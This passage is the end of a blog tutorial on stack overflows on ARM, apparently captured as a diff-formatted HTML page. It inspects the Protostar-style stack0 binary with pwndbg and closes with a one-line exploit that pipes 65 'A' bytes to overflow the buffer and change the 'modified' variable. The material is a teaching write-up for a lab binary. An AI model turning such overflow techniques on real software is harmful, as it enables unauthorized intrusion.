+<span class="err">0</span><span class="nf">x10498</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">76</span><span class="o">&gt;</span><span class="p">:</span><span class="w">  </span><span class="mh">0xe24bd004</span><span class="w">  </span><span class="mh">0xe8bd8800</span><span class="w">  </span><span class="mh">0x0001051c</span><span class="w">  </span><span class="mh">0x00010548</span><span class="w"></span>
+</code></pre></div>
+
+<p>почему?</p>
+<blockquote>
+<p>“When using R15 as the base register you must remember it contains an address 8 bytes on from the address of the current instruction.” <cite class="epigraph">Arm documentation</cite></p>
+</blockquote>
+<p>So it is 0x10498 + 0x8:</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="nf">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="nv">x</span><span class="o">/</span><span class="mi">4</span><span class="w"> </span><span class="mh">0x104a0</span><span class="w"></span>
+<span class="err">0</span><span class="nf">x104a0</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">84</span><span class="o">&gt;</span><span class="p">:</span><span class="w">  </span><span class="mh">0x0001051c</span><span class="w">  </span><span class="mh">0x00010548</span><span class="w">  </span><span class="mh">0xe92d43f8</span><span class="w">  </span><span class="mh">0xe1a07000</span><span class="w"></span>
+
+<span class="nf">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="nv">p</span><span class="w"> </span><span class="p">(</span><span class="nv">char</span><span class="o">*</span><span class="p">)</span><span class="mh">0x0001051c</span><span class="w"></span>
+<span class="nf">$21</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="mh">0x1051c</span><span class="w"> </span><span class="s">&quot;you have changed the &#39;modified&#39; variable&quot;</span><span class="w"></span>
+</code></pre></div>
+
+<h2 id="the-exploit">The exploit</h2>
+<p>Writing 0x40+1 bytes we will overflow the buffer overwriting the cookie in the stack but without corrupting the stack further.</p>
+<div class="highlight-candombe"><pre><span></span><code>pi@raspberrypi:~$ <span class="nb">echo</span> -n <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span class="p">|</span> ./stack0
+you have changed the <span class="s1">&#39;modified&#39;</span> variable
+</code></pre></div>
+
+</article>
+<span class="print-footer">Smashing ARM Stack for Fun - Part I - January 14, 2021 - Martin Di Paola</span>
+<footer>
+    <hr class="slender">
+    <div class="credits">
+        <span>&copy;
+            Martin Di Paola
+        </span></br>
+            <a class="raw_link" href="/feed.xml"><img height="16px" width="16px" src="/img/rss-32px.png" /></a>
+            <a class="raw_link" href="https://github.com/eldipa"><img height="16px" width="16px" src="/img/github.png" /></a>
+        <br>
+        
+        <a href="mailto:martinp.dipaola@gmail.com">martinp.dipaola@gmail.com</a></span></br> <br>
+        
+    </div>
+</footer>
+</body>
+</html>
